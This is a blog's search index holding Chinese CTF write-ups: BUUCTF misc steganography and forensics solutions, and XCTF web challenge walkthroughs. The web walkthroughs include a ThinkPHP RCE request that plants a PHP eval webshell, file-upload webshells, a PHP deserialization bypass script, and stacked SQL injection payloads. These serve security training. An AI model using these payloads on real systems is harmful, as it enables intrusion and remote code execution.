<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf misc wp (持续更新)</title>
      <link href="/2025/03/05/buuctf%20misc%20wp/"/>
      <url>/2025/03/05/buuctf%20misc%20wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><blockquote><p>逐帧查看即可看到flag<img src="/img/1misc.jpg" alt="输入图片说明"><br><img src="/img/2misc.jpg" alt="输入图片说明"><img src="/img/3misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><blockquote><p>直接拖入winhex，搜索flag<br>拿到flag<img src="/img/4misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><blockquote><p>二维码的内容是这个，但是没什么用<br><img src="/img/5misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>放进winhex看一下<br>发现一个txt文本，并且发现PK标识<br>改后缀为.zip就可以看到文本</p></blockquote><blockquote><p>有密码<img src="/img/6misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>使用工具进行爆破，拿到flag<br><img src="/img/7misc.jpg" alt="输入图片说明"><br><img src="/img/8misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><blockquote><p>下载后发现宽度和高度明显不一致<br>放入010修改一下<br>第二行的前四个表示宽度，后四个表示高度，将01改为02，就能看到flag<img src="/img/9misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><blockquote><p>直接过滤password拿到flag<img src="/img/10misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><blockquote><p>直接拖入winhex，左后就是flag<br><img src="/img/11misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><blockquote><p>下载后是个.exe程序，点击是打不开的，直接放进winhex<br>发现一段base64编码后的jpg图片，去网上随便找个base64转图片<br><img src="/img/12misc.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/13misc.jpg" alt="输入图片说明"></p><blockquote><p>手机微信扫一扫拿到flag</p></blockquote><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><blockquote><p>直接工具爆破就可以拿到密码<img src="/img/14misc.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/15misc.jpg" alt="输入图片说明"><img src="/img/16misc.jpg" alt="输入图片说明"></p><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><blockquote><p>直接放到winhex里，就可以看到flag<img src="/img/17misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><blockquote><p>正如题目所述，是zip伪加密<br>直接使用winrar修复一下，再重新打开，就能看到flag<img src="/img/18misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><blockquote><p>题目提示是LSB，那么直接打开stegsolve看一下lsb，拿到一张二维码，再放进QR_research拿到flag<br><img src="/img/19misc.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/20misc.jpg" alt="输入图片说明"></p><p><img src="/img/21misc.jpg" alt="输入图片说明"></p><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><blockquote><p>直接过滤flag拿到flag<br><img src="/img/22misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><blockquote><p>直接爆破拿到密码取出flag<img src="/img/23misc.jpg" alt="输入图片说明"><img src="/img/24misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><blockquote><p>直接用工具看一下拿到flag<img src="/img/25misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><blockquote><p>放进stegsolve看一下，LSB隐写，拿到flag<img src="/img/26misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><blockquote><p>直接放进winhex</p><p>发现一个flag.txt<br>改后缀为zip还想一个加密文件，爆破无果，再次翻了翻winhex找到密码<img src="/img/27misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p><img src="/img/28misc.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/29misc.jpg" alt="输入图片说明"></p><p><img src="/img/30misc.jpg" alt="输入图片说明"></p><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><blockquote><p>这玩意长得真丑<br>首先放进winhex看到PK和.txt<br>直接改后缀为.zip<br>拿到一个加密后的zip文件<br>根据题目提示4位数密码<br>直接爆破拿到密码<br>然后拿到flag</p></blockquote><p><img src="/img/31misc.jpg" alt="输入图片说明"></p><p><img src="/img/32misc.jpg" alt="输入图片说明"></p><p><img src="/img/33misc.jpg" alt="输入图片说明"></p><p><img src="/img/34misc.jpg" alt="输入图片说明"></p><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h3><blockquote><p>放进winhex，发现一个2.txt,改后缀为.zip发现加密了<br>直接爆破拿到密码，拿到flag<img src="/img/35misc.jpg" alt="输入图片说明"><img src="/img/36misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><blockquote><p>打开后全部都是tcp的，直接追踪tcp流，拿到flag<br><img src="/img/37misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h3><blockquote><p>直接放进winhex里，搜索字符串flag，base64解码后就是flag<img src="/img/38misc.jpg" alt="输入图片说明"><img src="/img/39misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><blockquote><p>放进winhex拉到最下面,发现一串二进制，转为字符串就是flag<img src="/img/40misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p><img src="/img/41misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><blockquote><p>首先先看http的，翻了一下还想这个http里面有一串base64编码后的字符，解码后是一张含有flag的图片，拿到flag<br><img src="/img/42misc.jpg" alt="输入图片说明"><img src="/img/43misc.jpg" alt="输入图片说明"><img src="/img/44misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><blockquote><p>首先爆破拿到密码<br><img src="/img/45misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>注意到给的是一串brainfuck编码后的字符<img src="/img/46misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>解码后拿到flag<img src="/img/47misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><blockquote><p>首先是LSB隐写，放进Stegolve中，提取数据时发现最开始是PK开头，存储为1.zip，发现果然有内容<br>但是读取不了<br>将文件取出来，放进kali中去，使用strings读取数据，就能拿到flag<img src="/img/48misc.jpg" alt="输入图片说明"><img src="/img/49misc.jpg" alt="输入图片说明"><img src="/img/50misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><blockquote><p>打开后是一张图片和一张加密后的文件<br>图片下面是一段盲文<br>很明显这段盲文就是密码</p></blockquote><p><img src="/img/51misc.jpg" alt="输入图片说明"></p><blockquote><p>比对一下拿到密码<br>密码为<code>kmdonowg</code></p></blockquote><blockquote><p>输入后打开的是一段音频，听声音是摩斯密码，放进Audacity,看一下轨迹<br><img src="/img/52misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>比较长的是-<br>相对短的是.<br>空格就是空格</p></blockquote><blockquote><p>拼凑得到下面盲文<br>-.-.  -  ..-.  .–  .–.  .  ..  —–  —..  –…  …–  ..—  ..–..  ..—  …–  -..  –..</p></blockquote><blockquote><p>解码得到CTFWPEI08732?23DZ<br><img src="/img/53misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>删去ctf，并且大写字母都改为小写，加上flag{},才是最终的flag</p></blockquote><blockquote><p>flag{wpei08732?23dz}</p></blockquote><h3 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h3><blockquote><p>放进D盾里查杀一下<br>发现后门<img src="/img/54misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>进去后就可以看到flag<img src="/img/55misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h3><blockquote><p>直接放进D盾里<br>查到后，点开就是答案</p></blockquote><p><img src="/img/56misc.jpg" alt="输入图片说明"><img src="/img/57misc.jpg" alt="输入图片说明"></p><h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><blockquote><p>放进Audacity发现一段摩斯密码<br>解码后就是flag<img src="/img/58misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>解出为<br>….. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. ..-. ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-. </p></blockquote><blockquote><p>解码后就是flag<br><img src="/img/59misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><blockquote><p>拿到图片直接放进winhex<br>可以看到这里有个flag的文件，修改后缀为.zip就可以看到<br>并且提示我们需要解压<br>放进kali里使用7z进行解压，可以得到两个编码后的flag段，解码后拼接就是flag<img src="/img/60misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>改后缀为.zip得到flag.vmdk文件</p></blockquote><blockquote><p>在kali中打开终端输入<br>7z x flag.vmdk<br>就能拿到里面的文件<br>解码后拼接拿到flag</p></blockquote><p><img src="/img/61misc.jpg" alt="输入图片说明"><img src="/img/62misc.jpg" alt="输入图片说明"><img src="/img/63misc.jpg" alt="输入图片说明"><img src="/img/64misc.jpg" alt="输入图片说明"><img src="/img/65misc.jpg" alt="输入图片说明"></p><blockquote><p>拼接拿到flag<br>flag{N7F5_AD5_i5_funny!}</p></blockquote><h3 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h3><blockquote><p>给的是conf.bin文件，直接打开打不开，这里结合题目中的宽带数据泄露，推测这可能是一个路由的配置文件<br>这里用的工具是routerpassview<br>可以看到里面的信息<br>这里搜索password,username等关键词试试<br>username的内容为flag<br><img src="/img/66misc.jpg" alt="输入图片说明"></p></blockquote><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><blockquote><p>涉及到了伪加密和steghide的用法</p><p>首先拿到的是一张图片，直接binwalk分离一下<br>拿到加密文件</p></blockquote><p><img src="/img/67misc.jpg" alt="输入图片说明"></p><blockquote><p><img src="/img/68misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里使用kali打不开，推测可能是伪加密，放进winhex后，发现果然是伪加密<img src="/img/69misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里将01改为00就破解了伪加密，我们可以看到一张图片，这张图片的信息要使用steghide分离出来<img src="/img/70misc.jpg" alt="输入图片说明"><img src="/img/71misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们就得到了zip加密的密码<img src="/img/72misc.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>输入后拿到flag<img src="/img/73misc.jpg" alt="输入图片说明"></p></blockquote><hr><p>buuctf misc第一面结束，认识了一些工具，熟悉了一些图片隐写的基本攻击方面，收获还是挺大的。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 wp (持续更新)</title>
      <link href="/2025/02/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20wp%20(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
      <url>/2025/02/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20wp%20(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><blockquote><p>根据题目提示直接访问robots.txt，拿到flag的路径，访问就可以拿到<img src="/img/1g.jpg" alt="输入图片说明"><img src="/img/2g.jpg" alt="输入图片说明"></p></blockquote><h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><blockquote><p>尝试发现Index.phps有东西，访问源代码果然发现php代码<img src="/img/3g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里需要进行两次url编码，进行两次url编码后能够绕过第一个强相等，并且在url解码后与admin弱相等<br>这里使用hackbar的全字符url编码<br>拿到flag<img src="/img/4g.jpg" alt="输入图片说明"></p></blockquote><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><blockquote><p>这里考察的是绕过__wakeup魔术方法，这个魔术方法是在反序列化时自动执行的，只要在序列化的时候将属性的数量改大一些就可以绕过<br><img src="/img/5g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里将1改为2进行绕过<br>传入后自动跳转flag</p></blockquote><p><img src="/img/6g.jpg" alt="输入图片说明"></p><h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><blockquote><p>这里发现id，并且传入的值只能是数字，经过BP爆破后发现传入2333能拿到flag<img src="/img/7g.jpg" alt="输入图片说明"></p></blockquote><h3 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h3><blockquote><p>直接Ctrl+u查看源代码拿到flag<img src="/img/8g.jpg" alt="输入图片说明"></p></blockquote><h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><blockquote><p>按照题目提示传入即可<br><img src="/img/9g.jpg" alt="输入图片说明"></p></blockquote><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><blockquote><p>直接访问robots.txt，然后访问拿到的网址拿到flag<img src="/img/10g.jpg" alt="输入图片说明"><img src="/img/11g.jpg" alt="输入图片说明"></p></blockquote><h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><blockquote><p>直接访问Index.php.bak拿到flag<img src="/img/12g.jpg" alt="输入图片说明"></p></blockquote><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote><p>首先查看cookie<br>发现一个网址cookie.php<br>访问后让我们看回应<br>发现flag<br><img src="/img/13g.jpg" alt="输入图片说明"><img src="/img/14g.jpg" alt="输入图片说明"><img src="/img/15g.jpg" alt="输入图片说明"></p></blockquote><h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><blockquote><p>这里提示是前端的问题了，在前端我么你发现了一个disabled的语句，直接删除就可以拿到flag<img src="/img/16g.jpg" alt="输入图片说明"><br><img src="/img/17g.jpg" alt="输入图片说明"></p></blockquote><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><blockquote><p>这里考察的是绕过正则匹配，只需要将O:x改为O:+x就可以进行绕过，还有绕过wakeup魔术方法，只要将属性的数量改大一些就可以绕过</p><p>这里用到str_replace<br>用法例如$a&#x3D;str_replace(“:1:”,”:2:”,$a);<br>这里就是将$a字符串中的，:1:替换为:2:，如果直接序列化语句</p></blockquote><blockquote><p>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}<br>手动改为<br>O:+4:”Demo”:2:{s:10:”Demofile”;s:8:”fl4g.php”;}<br>然后再base64编码的话，会因为不可见字符的原因，而失败<br>直接base64编码后得到的是<br>TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30&#x3D;<br>这里是不正确的<br>Demofile前后各有一个不可见字符<br>因而我们使用str_replace，这样就可以避免因为不可见字符而失败</p></blockquote><blockquote><p>构造payload</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:4&quot;</span>,<span class="string">&quot;:+4&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>拿到flag<img src="/img/18g.jpg" alt="输入图片说明"></p></blockquote><h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><blockquote><p>查看源代码提示我们用户名为admin并且使用BP爆破<img src="/img/19g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>BP爆破发现密码为123456<img src="/img/20g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>登录拿到flag<img src="/img/21g.jpg" alt="输入图片说明"></p></blockquote><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><blockquote><p>a要求和0弱相等并且不能为0<br>a&#x3D;0a绕过，不会读到a但是不为0<br>b要求不能全为数字并且大于1234<br>使用1235a绕过<img src="/img/22g.jpg" alt="输入图片说明"></p></blockquote><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><blockquote><p>源代码是index.php，访问index.php的时候进行抓包可以看到flag<br><img src="/img/23g.jpg" alt="输入图片说明"></p></blockquote><h3 id="inget"><a href="#inget" class="headerlink" title="inget"></a>inget</h3><blockquote><p>这里存在sql注入，输入万能密码后拿到flag，注意#要用%23代替<img src="/img/24g.jpg" alt="输入图片说明"></p></blockquote><h3 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h3><blockquote><p>首先上传一个user.ini文件，再上传一句话木马就可以拿到flag<br>user.ini文件需要将Content-Type改成image&#x2F;jpeg，作用相当于文件包含，包含出a.jpg的内容，a.jpg再写入一句话木马，就可以连接蚂剑拿到flag<br><img src="/img/25g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>上传a.jpg<img src="/img/26g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里有个很奇怪的地方，就是图片的路径，直接连接题目中给的路径是连接不上的，经过查找找到另外一个路径拿到flag<img src="/img/27g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>连接蚁剑即可<img src="/img/28g.jpg" alt="输入图片说明"></p></blockquote><h3 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h3><blockquote><p>首先查看源代码发现一段php代码，意思是通过Cookie传入language的值，如果有内容就不会执行包含english.php否则会包含language.php</p></blockquote><blockquote><p>当然题目是不会这么简单的，题目对flag有过滤，我们使用filter伪协议可以进行绕过拿到flag<img src="/img/29g.jpg" alt="输入图片说明"><img src="/img/30g.jpg" alt="输入图片说明"><img src="/img/31g.jpg" alt="输入图片说明"></p></blockquote><h3 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h3><blockquote><p>题目意思是如果file2的内容是<code>hello ctf</code>，那么就包含file1，我们使用data伪协议对file2内容进行写入，题目中对于flag.php进行了过滤，我们使用filter伪协议对其进行绕过，最终拿到flag</p></blockquote><p><img src="/img/32g.jpg" alt="输入图片说明"><img src="/img/33g.jpg" alt="输入图片说明"></p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><blockquote><p>第一个if绕过<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code><br>要求a的值大于6000000并且长度小于三，我们可以使用科学计数法进行绕过<br>a&#x3D;1e8<br>相当于100000000</p></blockquote><blockquote><p>第二个if绕过<br><code>if(isset($b) &amp;&amp; &#39;8b184b&#39; === substr(md5($b),-6,6))</code>要求b的值经过MD5加密后最后六个字符是8b184b</p><p>substr的第一个值是要进行截取的字符串,第二个是开始截取的位置如果是负数，就是从倒数第几个数开始截取，第三个是要截取字符串的长度</p><p>使用脚本找到合适的值<br>脚本附上</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>![输入图片说明](/img/<span class="number">34</span>g.jpg)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$counter</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">strval</span>(<span class="variable">$counter</span>); <span class="comment">// 将计数器转换为字符串</span></span><br><span class="line"><span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$md5_hash</span>, -<span class="number">6</span>) === <span class="string">&#x27;8b184b&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$counter</span>++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">find_b</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;符合条件的 <span class="subst">$b</span> 值是: &quot;</span> . <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/img/35g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>b&#x3D;53724可以绕过第二个if</p></blockquote><blockquote><p>第三个if考察的是对于<code>json</code>的格式和<code>DGGJ</code>在低版本php里与0弱相等<br>json的格式例如c&#x3D;{“aaa”:”254”,”a”:”544”}这样<br>如果是数组那么就不需要””了<br><code>if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)</code>这里要求c是数组，c里m的值不能全为数字，并且要求大于2022<br>这里考察的是弱相等，数字后面的字母不会读取<br>c&#x3D;{“m”:”2023a”}<br>可以绕过</p></blockquote><blockquote><p>第四个if<br><code>if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))</code>要求n是数组，并且长度是2，而且n数组的第一个值也是数组<br>这里使用二维数组进行绕过<br>c&#x3D;{“m”:”2023a”,”n”:[[],:””]}</p></blockquote><blockquote><p>最后要求数组内容里要有DGGJ又要求没有DGGJ，这是最后一个考察点<br>array_search的查找比较的是弱相等,在低版本php中DGGJ与0是弱相等的<br>因而我们把n数组的第二个值改为0就可以进行绕过<br>后面要求n数组里面不能含有DGGJ,这里比较的是强相等，因为的确没写入，所以可以直接绕过<br>c&#x3D;{“m”:”2023a”,”n”:[[],:”0”]}</p></blockquote><blockquote><p>综上最终payload为<br><code>?a=1e8&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2023a&quot;,&quot;n&quot;:[[],0]&#125;</code><br><img src="/img/36g.jpg" alt="输入图片说明"></p></blockquote><h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><blockquote><p>只需要抓包将图片马后缀改为php就可以绕过<br><img src="/img/37g.jpg" alt="输入图片说明"><img src="/img/38g.jpg" alt="输入图片说明"></p></blockquote><h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><blockquote><p>第一关要求ip必须是123.123.123.123<br>BP加上X-Forwarded-For:123.123.123.123即可<br>第二关要求来自<br>BP加上referer;网址即可<br>最后拿到flag<img src="/img/39g.jpg" alt="输入图片说明"></p></blockquote><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><blockquote><p>构造payload写入shell<br><code>?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=&lt;?php @eval($_POST[a]);?&gt;</code><br>然后访问shell.php通过一句话木马拿到flag<br><img src="/img/40g.jpg" alt="输入图片说明"></p></blockquote><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><blockquote><p>直接data伪协议拿到flag<br><img src="/img/41g.jpg" alt="输入图片说明"></p></blockquote><h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><blockquote><p>考察的是堆叠注入<br>1’;show databases# 查所有库名<br>1’;show tables# 查所有的表名<br>1’;show columns from <code>表名</code>#<br>1’;prepare y from concat(‘sel’,’ect*from<code>表名</code>‘);execute y;#</p></blockquote><blockquote><p>拿到所有表名<img src="/img/42g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>查看指定表名的所有列名<br><img src="/img/43g.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们发现这张表里有flag<br>然后我们直接看这张表的全部内容，就能拿到flag<br><img src="/img/44g.jpg" alt="输入图片说明"><br>我们发现这里过滤了select，我们要对select 进行绕过</p></blockquote><blockquote><p>1’;prepare y from concat(‘sel’,’ect*from<code>1919810931114514</code>‘);execute y ;#<br>我们就能拿到flag<br><img src="/img/45g.jpg" alt="输入图片说明"></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf wp（持续更新）</title>
      <link href="/2025/02/22/buuctf%20wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
